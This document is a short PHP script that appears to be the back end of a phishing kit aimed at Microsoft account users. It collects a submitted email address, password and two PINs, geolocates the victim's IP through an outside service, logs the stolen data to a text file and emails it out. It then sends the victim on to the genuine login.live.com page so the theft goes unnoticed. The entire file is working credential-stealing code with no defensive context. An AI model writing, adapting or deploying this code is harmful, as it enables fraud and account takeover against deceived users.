<?php
$ip = getenv("REMOTE_ADDR");
$date = date("M d, Y g:iA");
date_default_timezone_set('UTC');
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip)); 
$message .= "correo: ".$_POST['mail']."   -  "; 
$message .="password: ".$_POST['contra']." - "; 
$message .="pin 1: ".$_POST['pin']."  -  ";  
$message .="pin 2: ".$_POST['pin2']." -  "; 
$message .= "".$date."  - ";
$message .= "" . $ipdat->geoplugin_countryCode . " "; 
$message .="".$ip."\n";
$message .= "***************\n";
$fp = fopen('usuariosdejuanito.txt', 'a');
fwrite($fp, $message);
fclose($fp);
mail($to, $subj, $message, $from);
Header ("Location:https://login.live.com/");